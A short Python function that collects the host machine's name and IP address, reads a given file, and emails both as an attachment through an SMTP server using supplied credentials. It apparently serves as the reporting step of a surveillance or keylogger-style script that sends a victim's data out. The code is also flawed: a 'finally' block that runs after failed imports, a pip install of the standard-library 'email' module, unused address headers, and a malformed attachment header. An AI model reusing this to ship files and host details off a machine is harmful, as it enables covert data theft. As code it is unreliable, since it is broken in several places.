def send_mail(email, password, message, type):
    try: #import necessary libraries
        import smtplib
        import socket
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
    except ModuleNotFoundError:
        from subprocess import call
        modules = ["email"]
        call("pip install " + ' '.join(modules), shell=True)
    finally:
        FILENAME = message
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname) 
        fromaddr = "EMAIL address of the sender"
        toaddr = "EMAIL address of the receiver"
        msg = MIMEMultipart()  
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = type
        body = hostname+" "+IPAddr
        msg.attach(MIMEText(body, 'plain'))
        f=open(FILENAME,"rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((f).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename")
        msg.attach(p)
        server = smtplib.SMTP(host='smtp.mailtrap.io', port=2525)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, email, text)
        server.quit()